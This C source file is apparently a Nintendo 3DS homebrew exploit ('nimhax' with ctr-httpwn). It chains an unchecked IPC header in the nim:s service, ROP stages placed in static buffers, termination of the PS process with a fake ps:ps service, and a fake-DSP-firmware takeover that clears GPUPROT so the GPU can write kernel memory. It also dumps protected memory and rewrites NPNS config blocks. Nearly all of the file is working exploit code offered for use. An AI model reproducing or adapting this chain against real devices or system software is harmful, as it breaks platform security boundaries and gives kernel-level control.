#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <3ds.h>

#include <common_errors.h>

//#include <utils/crypto.h>
#include <utils/fileio.h>

#define PSTID 0x0004013000003102ULL
#define DSPTID 0x0004013000001A02ULL

static inline void dbg(void)
{
    u32 gpuprot = *(vu32 *)0x90140140;
    printf("[INFO] GPUPROT = %08lx\n", gpuprot);
}

Result initialize_ctr_httpwn(const char* serverconfig_localpath);

static Handle nimsHandle = 0;
static int nimsRefCount = 0;

static Result _nimsInit() {
	Result res;
	if (AtomicPostIncrement(&nimsRefCount)) return 0;
	res = srvGetServiceHandle(&nimsHandle, "nim:s");
	if (R_FAILED(res)) AtomicDecrement(&nimsRefCount);

	return res;
}

static void _nimsExit(void) {
	if (AtomicDecrement(&nimsRefCount)) return;
	svcCloseHandle(nimsHandle);
}

extern const u32 NIMS_0x5E_IPC_PwnedReplyBase[];
extern const u32 NIMS_0x5E_IPC_PwnedReplyBase_size;

extern const u32 NIMS_0x5E_StackRecoveryPivot[];
extern const u32 NIMS_0x5E_StackRecoveryPivot_size;

extern const u32 NIMS_0x5E_ROP_STAGE2_Part1[];
extern const u32 NIMS_0x5E_ROP_STAGE2_Part1_size;

extern const u32 NIMS_0x5E_ROP_STAGE2_Part2[];
extern const u32 NIMS_0x5E_ROP_STAGE2_Part2_size;

extern const u32 NIMS_0x5E_ROP_TakeOver[];
extern const u32 NIMS_0x5E_ROP_TakeOver_size;

Result NIMS_PWNCMD0x5EPart1(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x5e, 0, 6); // normally, it should be 0x005e0000, but there's no checks in argumentless cmds, so we'll abuse this to shove a ROP into staticbufs for second stage after httpwn causes stage 1 to run
	cmdbuf[1] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_STAGE2_Part1_size, 2); // max 0x1000
	cmdbuf[2] = (u32)NIMS_0x5E_ROP_STAGE2_Part1;
	cmdbuf[3] = IPC_Desc_StaticBuffer(NIMS_0x5E_IPC_PwnedReplyBase_size, 0); // max 0x40
	cmdbuf[4] = (u32)NIMS_0x5E_IPC_PwnedReplyBase;
	cmdbuf[5] = IPC_Desc_StaticBuffer(NIMS_0x5E_StackRecoveryPivot_size, 1); // max 0x400
	cmdbuf[6] = (u32)NIMS_0x5E_StackRecoveryPivot;

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x5e, 2, 0)) {
		if (haxran) *haxran = false;
		return (Result)cmdbuf[1];
	}

	if (haxran) *haxran = cmdbuf[2];

	return (Result)cmdbuf[1];
}

Result NIMS_PWNCMD0x5EPart2(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x5e, 0, 4);
	cmdbuf[1] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_STAGE2_Part2_size, 2); // max 0x1000
	cmdbuf[2] = (u32)NIMS_0x5E_ROP_STAGE2_Part2;
	cmdbuf[3] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_TakeOver_size, 0); // patched static buf
	cmdbuf[4] = (u32)NIMS_0x5E_ROP_TakeOver;

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x5e, 2, 0)) {
		if (haxran) *haxran = false;
	} else if (haxran) *haxran = true;

	return (Result)cmdbuf[1];
}

Result NIMS_Custom0x1001(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x1001, 0, 0);

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x1001, 1, 0)) {
		if (haxran) *haxran = false;
	} else if (haxran) *haxran = true;

	return (Result)cmdbuf[1];
}

#define TRY(expr) if(R_FAILED(res = (expr))) return res;

static Result dspTakeoverClientAction(void)
{
	// The end goal is to write 0 to CFG11_GPUPROT to make the GPU be able to write to kernel memory.
	Result res = 0;
	bool isLoaded;

	TRY(dspInit());

	static u16 fakeDspFirmware[0x180] = {0}; // lenny

	res = DSP_LoadComponent(fakeDspFirmware, sizeof(fakeDspFirmware), 0xFF, 0xFF, &isLoaded);

	dspExit();

	TRY(NS_TerminateProcessTID(DSPTID, -1LL)); // send termination notification (0x100) to DSP & trigger the holy ROP
	svcSleepThread(100 * 1000 * 1000LL); // wait for DSP to cleanup and execute rop

	return res;
}

#if 0
static Result NIMS_GetErrorCode(int* error_code) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x31, 0, 0); // 0x00310000

	if (R_FAILED(ret = svcSendSyncRequest(*nimsGetSessionHandle()))) return ret;

	if (error_code) *error_code = cmdbuf[2];

	return (Result)cmdbuf[1];
}
#endif

Result funWithNim() {
	Result ret;
	bool haxran;

	ret = _nimsInit();
	if (R_FAILED(ret)) {
		printf("Failed to init nim:s. 0x%08lx\n", ret);
		return ret;
	}

	ret = nsInit();
	if (R_FAILED(ret)) {
		printf("Failed to init ns. 0x%08lx\n", ret);
		_nimsExit();
		return ret;
	}

	ret = NIMS_PWNCMD0x5EPart1(&haxran);
	printf("nims_0x5E part1 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims_0x5E pwn did not run.\n");
		nsExit();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}
	ret = NIMS_PWNCMD0x5EPart2(&haxran);
	printf("nims_0x5E part2 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims_0x5E pwn did not run.\n");
		nsExit();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}

	// 1) Kill PS immediately
	ret = NS_TerminateProcessTID(PSTID, 0);
	if (R_FAILED(ret))
	{
		printf("Failed to terminate PS\n");
		nsExit();
		_nimsExit();
		return ret;
	}

    svcSleepThread(250 * 1000 * 1000LL); // wait for pm to ask srv to cleanup

	// 2) Tell custom service to get ready for fake ps:ps service
	ret = NIMS_Custom0x1001(&haxran);
	printf("nims custom 0x1001 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims custom command did not run.\n");
		nsExit();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}

	svcSleepThread(100 * 1000 * 1000LL);

	// 3) profit
	ret = dspTakeoverClientAction();
	if (R_FAILED(ret))
		printf("DSP takeover (client part) failed: %08lx\n", ret);

	//dbg();

	nsExit();
	_nimsExit();
	return ret;
}
// ---------------------------------------

static Result check_nim_version() {
	Result ret = amInit();
	if(R_FAILED(ret))
		return ret;

	u64 nim_tid = 0x0004013000002C02LLU;
	AM_TitleEntry title_entry;

	ret = AM_GetTitleInfo(MEDIATYPE_NAND, 1, &nim_tid, &title_entry);

	if(R_SUCCEEDED(ret)) {
		if (title_entry.version != 14341) ret = RES_INVALID_VALUE;
		else ret = 0;
	}

	amExit();
	return ret;
}

// ---------------------------------------
// because there was no function to get current cfg handle
// copied some functions from ctrulib and added a new

static Handle cfgHandle;
static int cfgRefCount;

static Result _cfgInit(void)
{
	Result ret;

	if (AtomicPostIncrement(&cfgRefCount)) return 0;

	// cfg:i has the most commands, then cfg:s, then cfg:u
	ret = srvGetServiceHandle(&cfgHandle, "cfg:i");
	if(R_FAILED(ret)) ret = srvGetServiceHandle(&cfgHandle, "cfg:s");
	//if(R_FAILED(ret)) ret = srvGetServiceHandle(&cfguHandle, "cfg:u"); // not useful here
	if(R_FAILED(ret)) AtomicDecrement(&cfgRefCount);

	return ret;
}

static void _cfgExit(void)
{
	if (AtomicDecrement(&cfgRefCount)) return;
	svcCloseHandle(cfgHandle);
}

static Result _CFG_GetConfigInfoBlk4(u32 size, u32 blkID, volatile void* outData)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x401,2,2); // 0x4010082
	cmdbuf[1] = size;
	cmdbuf[2] = blkID;
	cmdbuf[3] = IPC_Desc_Buffer(size,IPC_BUFFER_W);
	cmdbuf[4] = (u32)outData;

	if(R_FAILED(ret = svcSendSyncRequest(cfgHandle)))return ret;

	return (Result)cmdbuf[1];
}

static Result _CFG_SetConfigInfoBlk4(u32 size, u32 blkID, volatile const void* inData)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x402,2,2); // 0x4020082
	cmdbuf[1] = blkID;
	cmdbuf[2] = size;
	cmdbuf[3] = IPC_Desc_Buffer(size,IPC_BUFFER_R);
	cmdbuf[4] = (u32)inData;

	if(R_FAILED(ret = svcSendSyncRequest(cfgHandle)))return ret;

	return (Result)cmdbuf[1];
}

static Result _CFGI_CreateConfigInfoBlk(u32 size, u32 blkID, u16 blkFlags, const void* inData)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x804,3,2); // 0x80400C2
	cmdbuf[1] = blkID;
	cmdbuf[2] = size;
	cmdbuf[3] = blkFlags;
	cmdbuf[4] = IPC_Desc_Buffer(size,IPC_BUFFER_R);
	cmdbuf[5] = (u32)inData;

	if(R_FAILED(ret = svcSendSyncRequest(cfgHandle)))return ret;

	return (Result)cmdbuf[1];
}

#define CFG_BLKID_NOT_FOUND MAKERESULT(RL_PERMANENT, RS_WRONGARG, RM_CONFIG, RD_NOT_FOUND)

static Result try_ensure_npns() {
	Result ret = _cfgInit();
	if (R_FAILED(ret)) {
		printf("Failed to init cfg. Assuming NPNS is set.\n");
		printf("Will fail if this not set!!\n");
		printf("Open eShop if exploit fails if able without updating.\n");
		return 0;
	}

	static const char expected_npns_server_selector[4] = {'L', '1', 0, 0};
	static const char dummy_npns_token[0x28] = {'A', 0};
	volatile char npns_server_selector[4] = {0};
	volatile char npns_token[0x28] = {0};

	ret = _CFG_GetConfigInfoBlk4(4, 0x150002, &npns_server_selector);
	if (ret == CFG_BLKID_NOT_FOUND) {
		ret = _CFGI_CreateConfigInfoBlk(4, 0x150002, 0xE, expected_npns_server_selector);
		npns_server_selector[0] = 'L';
	}

	if (R_SUCCEEDED(ret)) ret = _CFG_GetConfigInfoBlk4(0x28, 0xF0006, &npns_token);

	if (ret == CFG_BLKID_NOT_FOUND) {
		ret = _CFGI_CreateConfigInfoBlk(0x28, 0xF0006, 0xC, dummy_npns_token);
		npns_token[0] = 'A';
	}

	if (R_FAILED(ret)) {
		printf("Cannot guarantee NPNS is set!!\n");
		printf("Will fail if this not set!!\n");
		printf("Open eShop if pwn fails if able without updating.\n");
		return 0; // we'll try as well and hope
	}

	if (npns_token[0] == 0) {
		printf("Invalid NPNS Token, fixing...\n");
		ret = _CFG_SetConfigInfoBlk4(0x28, 0xF0006, dummy_npns_token);
	}

	if (R_SUCCEEDED(ret) && npns_server_selector[0] != 'l' && npns_server_selector[0] != 'L') {
		printf("Invalid NPNS Server selector, fixing...\n");
		ret = _CFG_SetConfigInfoBlk4(4, 0x150002, expected_npns_server_selector);
	}

	_cfgExit();
	return ret;
}

// ---------------------------------------

#if 0
static Result try_ensure_nim_tokens() {
	// init nim the standard way first
	Result ret = MAKERESULT(RL_FATAL, RS_OUTOFRESOURCE, RM_APPLICATION, RD_OUT_OF_MEMORY);
	void* mem = linearAlloc(0x200000);

	if (!mem) {
		printf("Failed to allocate linear memory.\n");
		return ret;
	}

	ret = nimsInit(mem, 0x200000);
	if (R_FAILED(ret)) {
		int error;
		Result _ret = NIMS_GetErrorCode(&error);
		if (R_FAILED(_ret)) printf("Failed to init nim:s and get error code. %08lX / %08lX\n", ret, _ret);
		else printf("Failed to init nim:s. %08lX / %03i-%04i\n", ret, error / 10000, error % 10000);
	}
	nimsExit();
	linearFree(mem);
	return ret;
}
#endif

Result gspwn_limit_test() {
	void* mem = linearMemAlign(0x80000, 0x1000);
	if (!mem) return -1;
	memset(mem, 0, 0x80000);
	Result ret = GSPGPU_FlushDataCache((void*)(0x38000000-0x80000), 0x80000);
	if (R_SUCCEEDED(ret)) ret = GSPGPU_FlushDataCache(mem, 0x80000);
	if (R_FAILED(ret)) {
		linearFree(mem);
		return ret;
	}
	ret = GX_TextureCopy((u32*)(0x38000000-0x80000), 0xFFFFFFFF, (u32*)mem, 0xFFFFFFFF, 0x80000, 0x8);
	if (R_FAILED(ret)) {
		linearFree(mem);
		return ret;
	}
	svcSleepThread(500 * 1000 * 1000);
	FILEIO* fp = fileio_open("sdmc:/dump_test.mem", "wb");
	if (!fp) {
		linearFree(mem);
		return -1;
	}
	fileio_write(mem, 1, 0x80000, fp);
	fileio_close(fp);
	linearFree(mem);
	return 0;
}

int main(int argc, char **argv)
{
	char *serverconfig_localpath = "nim_config.xml";
	Result ret = 0;

	gfxInitDefault();

	PrintConsole topScreen, bottomScreen;

	consoleInit(GFX_TOP, &topScreen);
	consoleInit(GFX_BOTTOM, &bottomScreen);

	consoleSelect(&bottomScreen);

	printf("nimhax with ctr-httpwn\n");
	printf("am11pwn with nimhax\n\n");

	ret = check_nim_version();

	//if(R_SUCCEEDED(ret)) {
	//	printf("Initializing nim...\n");
	//	try_ensure_nim_tokens(); // may not be the reason to lose hope yet if fail
	//} else {
		if (ret == RES_INVALID_VALUE) 
			printf("NIM version invalid, expecting v14341\n");
		else
			printf("Error while trying to check nim version. %08lX\n", ret);
	//}

	if (R_SUCCEEDED(ret)) {
		printf("Trying to ensure npns tokens...\n");
		ret = try_ensure_npns();
	}

	if (R_FAILED(ret)) {
		printf("NPNS is invalid but we failed to fix it!!\n");
		printf("res = 0x%08lx\n", ret);
	}

	gfxFlushBuffers();
	gfxSwapBuffers();
	gspWaitForVBlank();

	if (R_SUCCEEDED(ret)) {
		consoleSelect(&topScreen);

		ret = initialize_ctr_httpwn(serverconfig_localpath);

		gfxFlushBuffers();
		gfxSwapBuffers();
		gspWaitForVBlank();

		consoleSelect(&bottomScreen);

		printf("Initialized res = 0x%08lx\n", ret);
	}

	if (R_SUCCEEDED(ret)) ret = funWithNim();

	if (R_SUCCEEDED(ret)) {
		ret = gspwn_limit_test();
		printf("gspwn_limit_test: 0x%08lX\n", ret);
	}

	if (R_SUCCEEDED(ret)) printf("Done.\n");
	else {
		if (ret == RES_APT_CANCELED)
			{/* ignore */}
		else if (ret == RES_USER_CANCELED)
			printf("User Canceled.\n");
		else printf("Failed.\n");
	}

	if (ret != RES_APT_CANCELED) {

		printf("\nPress the START button to exit.\n");
		while (aptMainLoop())
		{
			gfxFlushBuffers();
			gfxSwapBuffers();
			gspWaitForVBlank();

			hidScanInput();

			u32 kDown = hidKeysDown();
			if (kDown & KEY_START)
				break; // break in order to return to hbmenu
		}
	}

	gfxExit();
	return 0;
}
